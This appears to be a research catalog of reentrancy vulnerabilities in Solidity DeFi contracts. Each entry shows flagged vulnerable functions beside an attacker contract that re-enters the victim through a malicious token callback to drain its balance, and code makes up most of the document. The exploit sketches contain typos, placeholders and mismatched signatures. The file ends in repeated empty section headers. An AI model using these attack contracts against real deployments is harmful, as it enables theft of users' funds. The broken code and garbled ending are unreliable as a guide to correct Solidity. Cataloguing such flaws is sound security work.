Reentrancy Exploitation Code
----------------------------

Reentrancy-AVS-1
^^^^^^^^^^^^^^^^

Vulnerable Code 1
"""""""""""""""""

::

    function sellOnApprove(
        IMultiToken _mtkn,
        uint256 _amount,
        ERC20 _throughToken,
        address[] _exchanges,
        bytes _datas,
        uint[] _datasIndexes, // including 0 and LENGTH values
        address _for
    )
        public
    {
        if (_throughToken == address(0)) {
            require(_mtkn.tokensCount() == _exchanges.length, "sell: _mtkn should have the same tokens count as _exchanges");
        } else {
            require(_mtkn.tokensCount() + 1 == _exchanges.length, "sell: _mtkn should have tokens count + 1 equal _exchanges length");
        }
        require(_datasIndexes.length == _exchanges.length + 1, "sell: _datasIndexes should start with 0 and end with LENGTH");

        _mtkn.transferFrom(msg.sender, this, _amount);
        _mtkn.unbundle(this, _amount);

        for (uint i = 0; i < _exchanges.length; i++) {
            bytes memory data = new bytes(_datasIndexes[i + 1] - _datasIndexes[i]);
            for (uint j = _datasIndexes[i]; j < _datasIndexes[i + 1]; j++) {
                data[j - _datasIndexes[i]] = _datas[j];
            }
            if (data.length == 0) {
                continue;
            }

            if (i == _exchanges.length - 1 && _throughToken != address(0)) {
                if (_throughToken.allowance(this, _exchanges[i]) == 0) {
                    _throughToken.asmApprove(_exchanges[i], uint256(-1));
                }
            } else {
                ERC20 token = _mtkn.tokens(i);
                if (_exchanges[i] == 0) {
                    token.asmTransfer(_for, token.balanceOf(this));
                    continue;
                }
                if (token.allowance(this, _exchanges[i]) == 0) {
                    token.asmApprove(_exchanges[i], uint256(-1));
                }
            }
            // solium-disable-next-line security/no-low-level-calls
            require(_exchanges[i].call(data), "sell: exchange arbitrary call failed");
        }

        _for.transfer(address(this).balance);   //vulnerability position_1
        if (_throughToken != address(0) && _throughToken.balanceOf(this) > 0) {     //vulnerability position_2       
            _throughToken.asmTransfer(_for, _throughToken.balanceOf(this));
        }
    }



Exploit Code
""""""""""""

::

    Contract ERC20{

    }
    Contract Attack is ERC20{
        uint count;
        address victimAddress;
        function setVictim(address  _victim){
            victimAddress = _victim;
        }
        funciton balanceof(address _address) payable{
            count++;
            if(count < 5){
                victimAddress.call(byte4(keccak256(“sellOnApprove(IMultiToken , uint256,  ERC20,  address[],  bytes,  uint[],  address)”)), ..., ..., ERC20(this), ..., ..., ..., this );
            }
        }
    }


Description
"""""""""""

Note the location of comment of vulnerability position_2:   IF _throughToken object obtained from a malicious address, the method of balanceOf can be a malicious function to reentrancy.Every single re-entry the comment of vulnerability position_1 will pick up the balance of Victim 


Reentrancy-AVS-2
^^^^^^^^^^^^^^^^

Vulnerable Code 1
"""""""""""""""""

::

    function buyFirstTokens(
            IMultiToken _mtkn,
            bytes _callDatas,
            uint[] _starts // including 0 and LENGTH values
            )
            public
            payable
        {
            change(_callDatas, _starts);

            uint tokensCount = _mtkn.tokensCount();
            uint256[] memory amounts = new uint256[](tokensCount);
            for (uint i = 0; i < tokensCount; i++) {
                ERC20 token = _mtkn.tokens(i);
                amounts[i] = token.balanceOf(this);
                if (token.allowance(this, _mtkn) == 0) {
                    token.asmApprove(_mtkn, uint256(-1));
                }
            }

            _mtkn.bundleFirstTokens(msg.sender, msg.value.mul(1000), amounts);
            if (address(this).balance > 0) {
                msg.sender.transfer(address(this).balance);     //vulnerability position_1
            }
            for (i = _mtkn.tokensCount(); i > 0; i--) {         //vulnerability position_2
                token = _mtkn.tokens(i - 1);
                token.asmTransfer(msg.sender, token.balanceOf(this));
            }
        }
    
    
Vulnerable Code 2
"""""""""""""""""

::

    function buyFirstTokens(
        IMultiToken mtkn,
        bytes callDatas,
        uint[] starts, // including 0 and LENGTH values
        uint ethPriceMul,
        uint ethPriceDiv
    )
        public
        payable
    {
        change(callDatas, starts);

        uint tokensCount = mtkn.tokensCount();
        uint256[] memory amounts = new uint256[](tokensCount);
        for (uint i = 0; i < tokensCount; i++) {
            ERC20 token = mtkn.tokens(i);
            amounts[i] = token.balanceOf(this);
            if (token.allowance(this, mtkn) == 0) {
                token.asmApprove(mtkn, uint256(-1));
            }
        }

        mtkn.bundleFirstTokens(msg.sender, msg.value.mul(ethPriceMul).div(ethPriceDiv), amounts);
        if (address(this).balance > 0) {
            msg.sender.transfer(address(this).balance);
        }
        for (i = mtkn.tokensCount(); i > 0; i--) {
            token = mtkn.tokens(i - 1);
            if (token.balanceOf(this) > 0) {   //different code
                token.asmTransfer(msg.sender, token.balanceOf(this));
            }
        }
    }


Exploit Code
""""""""""""

::

    contract IMultiToken{

    }
    Contract Attack is IMultiToken{
        uint count;
        address victimAddress;
        function setVictim(address  _victim){
            victimAddress = _victim;
        }
        funciton tokensCount() payable{
            count++;
            if(count < 5){
                victimAddress.call(byte4(keccak256(“buyFirstTokens(IMultiToken , bytes,  uint[])”)), Attack(this), ..., ...);
            }
        }
        function() payable{

        }
    }


Description
"""""""""""

Note the location of comment of vulnerability position_2: IF IMultiToken object obtained from a malicious address, the method of buyFirstTokens can be a malicious function to reentrancy.Every single re-entry the comment of vulnerability position_1 will pick up the balance of Victim. ps:"...." represent an appropriate parameter


Reentrancy-AVS-3
^^^^^^^^^^^^^^^^

Vulnerable Code 1
"""""""""""""""""

::

    function sendEthProportion(address target, bytes data, uint256 mul, uint256 div) external {
            uint256 value = address(this).balance.mul(mul).div(div);
            // solium-disable-next-line security/no-call-value
            require(target.call.value(value)(data));   //vulnerability position
    }


Vulnerable Code 2
"""""""""""""""""

::

    function kyberSendEthProportion(IKyberNetworkProxy _kyber, ERC20 _fromToken, address _toToken, uint256 _mul, uint256 _div) external {
            uint256 value = address(this).balance.mul(_mul).div(_div);
            _kyber.trade.value(value)(
                _fromToken,
                value,
                _toToken,
                this,
                1 << 255,
                0,
                0
            );
    }


Exploit Code
""""""""""""

::

    Contract Attack{
        uint count;
        address victimAddress;
        bytes  bs4 = new bytes(4);
        bytes4 functionSignature = bytes4(keccak256("startAttack()"));
        
        function setVictim(address  _victim){
            victimAddress = _victim;
        }

        funciton startAttack(address _address) payable{
            for (uint i = 0; i< bs4.length; i++){
                bs4[i] = functionSignature[i];
            }
            count++;
            if(count < 5){
                victimAddress.call(byte4(keccak256(“sendEthProportion(address, bytes,  uint256,  uint256)”)), this, bs4, 10, 1);
            }
        }
    }


Description
"""""""""""

Note the location of comment of vulnerability position: IF argument "target"" is transmited from a malicious address, the method of startAttack can be a malicious function to reentrancy.


Reentrancy-AVS-6
^^^^^^^^^^^^^^^^

Vulnerable Code 1
"""""""""""""""""

::

    function convertSafe(
            TokenConverter converter,
            Token fromToken,
            Token toToken,
            uint256 amount
        ) internal returns (uint256 bought) {
            if (fromToken != ETH_ADDRESS) require(fromToken.approve(converter, amount));
            uint256 prevBalance = toToken != ETH_ADDRESS ? toToken.balanceOf(this) : address(this).balance;
            uint256 sendEth = fromToken == ETH_ADDRESS ? amount : 0;
            uint256 boughtAmount = converter.convert.value(sendEth)(fromToken, toToken, amount, 1); //Vulnerable position
            require(
                boughtAmount == (toToken != ETH_ADDRESS ? toToken.balanceOf(this) : address(this).balance) - prevBalance,
                "Bought amound does does not match"
            );
            if (fromToken != ETH_ADDRESS) require(fromToken.approve(converter, 0));
            return boughtAmount;
    }


Vulnerable Code 2
"""""""""""""""""

::

    function convertSafe(
        TokenConverter converter,
        Token fromToken,
        Token toToken,
        uint256 amount
    ) internal returns (uint256 bought) {
        if (fromToken != ETH_ADDRESS) require(fromToken.approve(converter, amount), "Error approving token transfer");   //different code
        uint256 prevBalance = toToken != ETH_ADDRESS ? toToken.balanceOf(this) : address(this).balance;
        uint256 sendEth = fromToken == ETH_ADDRESS ? amount : 0;
        uint256 boughtAmount = converter.convert.value(sendEth)(fromToken, toToken, amount, 1);
        require(
            boughtAmount == (toToken != ETH_ADDRESS ? toToken.balanceOf(this) : address(this).balance) - prevBalance,
            "Bought amound does does not match"
        );
        if (fromToken != ETH_ADDRESS) require(fromToken.approve(converter, 0), "Error removing token approve");
        return boughtAmount;
    }



Exploit Code
""""""""""""

::

    Contract TokenConverter {

    }
    Contract Attack is TokenConverter{
        uint count;
        address victimAddress;
        bytes  bs4 = new bytes(4);
        bytes4 functionSignature = bytes4(keccak256("startAttack()"));
        function setVictim(address  _victim){
            victimAddress = _victim;
        }
        funciton convert(Token fromToken, Token toToken, uint256 amount, uint256 a) payable{
            for (uint i = 0; i< bs4.length; i++){
                bs4[i] = functionSignature[i];
            }
            count++;
            if(count < 5){
                victimAddress.call(byte4(keccak256("convertSafe(TokenConverter , Token,  Token)")), TokenConverter(this),  ..., ...);
            }
        }
    }


Description
"""""""""""

Look at the row "vulnerability position".The variable 'converter' can be passed into any value by a malicious contract


Reentrancy-AVS-7
^^^^^^^^^^^^^^^^

Vulnerable Code 1
"""""""""""""""""

::

    function lend(address to, ERC20 token, uint256 amount, address target, bytes data) public payable {
            uint256 prevBalance = token.balanceOf(this);
            token.asmTransfer(to, amount);
            _inLendingMode += 1;
            require(caller().makeCall.value(msg.value)(target, data), "lend: arbitrary call failed");  //Vulnerable position_1
            _inLendingMode -= 1;
            require(token.balanceOf(this) >= prevBalance, "lend: lended token must be refilled"); //Vulnerable position_2
    }


::

    function lend(address to, ERC20 token, uint256 amount, address target, bytes data) public payable {
            uint256 expectedBalance = token.balanceOf(this).mul(TOTAL_PERCRENTS.add(_lendFee)).div(TOTAL_PERCRENTS);
            super.lend(to, token, amount, target, data);
            require(token.balanceOf(this) >= expectedBalance, "lend: tokens must be returned with lend fee");
    }


Exploit Code
""""""""""""

::

    contract ERC20{

    }
    Contract Attack is ERC20{
        uint count;
        address victimAddress;
        function setVictim(address  _victim){
            victimAddress = _victim;
        }
        funciton balanceOf() payable{
            count++;
            if(count < 5){
                victimAddress.call(byte4(keccak256(“lend(address , ERC20,  uint256, address, bytes)”)), ..., ERC20(this), ..., ..., ...);
            }
        }
        function() payable{

        }
    }


Description
"""""""""""

Note the location of comment of vulnerability position_2: IF token object obtained from a malicious address, the method of balanceOf can be a malicious function to reentrancy.Every single re-entry the comment of vulnerability position_1 will pick up the balance of Victim. ps:"...." represent an appropriate parameter


Reentrancy-AVS-8
^^^^^^^^^^^^^^^^

Vulnerable Code 1
"""""""""""""""""

::

    function withdraw (address account, address tokenAddr, uint256 index_from, uint256 index_to) external returns (bool) {
            require(account != address(0x0));

            uint256 release_amount = 0;
            for (uint256 i = index_from; i < lockedBalances[account][tokenAddr].length && i < index_to + 1; i++) {
                if (lockedBalances[account][tokenAddr][i].balance > 0 &&
                    lockedBalances[account][tokenAddr][i].releaseTime <= block.timestamp) {

                    release_amount = release_amount.add(lockedBalances[account][tokenAddr][i].balance);
                    lockedBalances[account][tokenAddr][i].balance = 0;
                }
            }

            require(release_amount > 0);

            if (tokenAddr == 0x0) {
                if (!account.send(release_amount)) {    //Vulnerable position_1
                    revert();
                }
                emit Withdraw(account, tokenAddr, release_amount);
                return true;
            } else {
                if (!ERC20Interface(tokenAddr).transfer(account, release_amount)) { //Vulnerable position_2
                    revert();
                }
                emit Withdraw(account, tokenAddr, release_amount);
                return true;
            }
    }


Vulnerable Code 2
"""""""""""""""""

::

    function withdraw (address account, address tokenAddr, uint256 max_count) external returns (bool) {
        require(account != address(0x0));

        uint256 release_amount = 0;
        for (uint256 i = 0; i < lockedBalances[account][tokenAddr].length && i < max_count; i++) {   //code different
            if (lockedBalances[account][tokenAddr][i].balance > 0 &&
                lockedBalances[account][tokenAddr][i].releaseTime <= block.timestamp) {

                release_amount = release_amount.add(lockedBalances[account][tokenAddr][i].balance);
                lockedBalances[account][tokenAddr][i].balance = 0;
            }
        }

        require(release_amount > 0);

        if (tokenAddr == 0x0) {
            if (!account.send(release_amount)) {
                revert();
            }
            emit Withdraw(account, tokenAddr, release_amount);
            return true;
        } else {
            if (!ERC20Interface(tokenAddr).transfer(account, release_amount)) {
                revert();
            }
            emit Withdraw(account, tokenAddr, release_amount);
            return true;
        }
    }//out9608


Exploit Code
""""""""""""

::

    contract ERC20Interface{

    }
    Contract Attack is ERC20Interface{
        uint count;
        address victimAddress;
        function setVictim(address  _victim){
            victimAddress = _victim;
        }
        funciton transfer(address account, address release_amount) payable{
            count++;
            if(count < 5){
                victimAddress.call(byte4(keccak256(“withdraw(address , address,  uint256, uint256)”)), this, this, ..., ...);
            }
        }
        function() payable{

        }
    }


Description
"""""""""""

Note the location of comment of vulnerability position_2: IF argument "tokenAddr" is transmited from a malicious address, the method of "transfer" can be a malicious function to reentrancy.Every single re-entry the comment of vulnerability position_1 will pick up the balance of Victim. ps:"...." represent an appropriate parameter


Reentrancy-AVS-9
^^^^^^^^^^^^^^^^

Vulnerable Code 1
"""""""""""""""""

::

    function buyInternal(
            ERC20 token,
            address _exchange,
            uint256 _value,
            bytes _data
        ) 
            internal
        {
            require(
                // 0xa9059cbb - transfer(address,uint256)
                !(_data[0] == 0xa9 && _data[1] == 0x05 && _data[2] == 0x9c && _data[3] == 0xbb) &&
                // 0x095ea7b3 - approve(address,uint256)
                !(_data[0] == 0x09 && _data[1] == 0x5e && _data[2] == 0xa7 && _data[3] == 0xb3) &&
                // 0x23b872dd - transferFrom(address,address,uint256)
                !(_data[0] == 0x23 && _data[1] == 0xb8 && _data[2] == 0x72 && _data[3] == 0xdd),
                "buyInternal: Do not try to call transfer, approve or transferFrom"
            );
            uint256 tokenBalance = token.balanceOf(this);
            require(_exchange.call.value(_value)(_data));        //Vulnerable position
            balances[msg.sender] = balances[msg.sender].sub(_value);
            tokenBalances[msg.sender][token] = tokenBalances[msg.sender][token]
                .add(token.balanceOf(this).sub(tokenBalance));
        }
    
    
Vulnerable Code 2
"""""""""""""""""

::

    function buyOne(
            ERC20 token,
            address _exchange,
            uint256 _value,
            bytes _data
            ) 
            payable
            public
            {
            balances[msg.sender] = balances[msg.sender].add(msg.value);
            uint256 tokenBalance = token.balanceOf(this);
            require(_exchange.call.value(_value)(_data));
            balances[msg.sender] = balances[msg.sender].sub(_value);
            tokenBalances[msg.sender][token] = tokenBalances[msg.sender][token]
                .add(token.balanceOf(this).sub(tokenBalance));
    }


Exploit Code
""""""""""""

::

    Contract Attack is XXXX{
        uint count;
        address victimAddress;
        bytes  bs4 = new bytes(4);
        bytes4 functionSignature = bytes4(keccak256("startAttack()"));
        function setVictim(address  _victim){
            victimAddress = _victim;
        }
        funciton startAttack() payable{
            for (uint i = 0; i< bs4.length; i++){
                bs4[i] = functionSignature[i];
            }
            count++;
            if(count < 5){
                victimAddress.call(byte4(keccak256(“buyInternal(ERC20, address, uint256, bytes)”)), ..., this, ..., bs4);
            }
        }
        function() payable{

        }
    }


Description
"""""""""""

Note the location of comment of vulnerability position_2: IF the paramete of '_exchange' is transformed from a malicious address, the method of "startAttack" can be a malicious function to reentrancy.Every single re-entry the comment of vulnerability position_1 will pick up the balance of Victim. ps:"...." represent an appropriate paramete.'XXXX' represents the Vulnerability contracts's name


Reentrancy-AVS-1
^^^^^^^^^^^^^^^^

Vulnerable Code 1
"""""""""""""""""

Reentrancy-AVS-1
^^^^^^^^^^^^^^^^

Vulnerable Code 1
"""""""""""""""""

Reentrancy-AVS-1
^^^^^^^^^^^^^^^^

Vulnerable Code 1
"""""""""""""""""

Reentrancy-AVS-1
^^^^^^^^^^^^^^^^

Vulnerable Code 1
"""""""""""""""""

Reentrancy-AVS-1
^^^^^^^^^^^^^^^^

Vulnerable Code 1
"""""""""""""""""

Reentrancy-AVS-1
^^^^^^^^^^^^^^^^

Vulnerable Code 1
"""""""""""""""""

Reentrancy-AVS-1
^^^^^^^^^^^^^^^^

Vulnerable Code 1
"""""""""""""""""

Reentrancy-AVS-1
^^^^^^^^^^^^^^^^

Vulnerable Code 1
"""""""""""""""""